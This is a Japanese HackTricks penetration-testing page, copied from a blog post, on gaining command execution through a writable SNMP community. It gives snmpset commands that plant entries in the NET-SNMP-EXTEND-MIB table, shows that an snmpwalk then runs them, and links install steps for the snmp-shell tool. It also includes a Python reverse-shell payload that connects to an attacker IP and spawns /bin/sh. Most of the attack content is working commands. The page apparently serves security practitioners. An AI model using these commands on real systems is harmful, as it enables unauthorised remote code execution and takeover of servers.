<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


この投稿は[https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)からコピーされました。

SNMPは時々、デバイスやサーバーの管理者によって見落とされ、デフォルトの設定のままにされています。Linuxオペレーティングシステム上で書き込み権限（**rwcommunity**）を持つSNMPコミュニティは、攻撃者がサーバー上でコマンドを実行するために悪用される可能性があります。

![](https://rioasmara.files.wordpress.com/2021/02/image-6.png?w=508)

# **サービスの拡張**

**snmpd.conf**で設定された既存のエントリを変更することはできませんが、MIB定義の“MAX-ACCESS”権限設定が“**read-create**”に設定されているため、SNMP経由で追加のコマンドを追加することが可能です。

新しいコマンドを追加するには、基本的に“**nsExtendObjects**”テーブルに追加の行を追加することによって行われます。
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
SNMPサービスに実行するコマンドを注入します。**NET-SNMP-EXTEND-MIB** では、実行可能ファイルへの絶対パスを常に指定する必要があります。呼び出されるバイナリ/スクリプトも存在し、実行可能でなければなりません。

![](https://rioasmara.files.wordpress.com/2021/02/image-15.png?w=916)

snmpwalkを使用して列挙することで、SNMPに注入したコマンドを実行します
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
コマンドが `/bin/echo` であることを示しています。

![](https://rioasmara.files.wordpress.com/2021/02/image-11.png?w=569)

コマンドは読み取られたときに実行されます。 **run-on-read()**

![](https://rioasmara.files.wordpress.com/2021/02/image-12.png?w=612)

コマンド **/bin/echo "hello rio is here"** は私たちのsnmpwalk読み取り中に実行されました

![](https://rioasmara.files.wordpress.com/2021/02/image-13.png?w=653)

# **Net-SNMP Extendからシェルを取得する**

このセクションでは、サーバーのシェルを取得してサーバーを制御する方法について説明します。

**mxrch** によって開発されたpythonスクリプトを使用できます。これは [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) からダウンロードできます。

これを実行するために必要なものをインストールできます：
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
**リバースシェルの作成**

SNMPに以下のコマンドを注入することで、手動でリバースシェルを作成することもできます。
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
```
snmpwalkを実行してコマンド実行をトリガーする

netcatが被害者からのreverseshell接続を受け取り、被害者マシンの制御を得ることができます

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
```
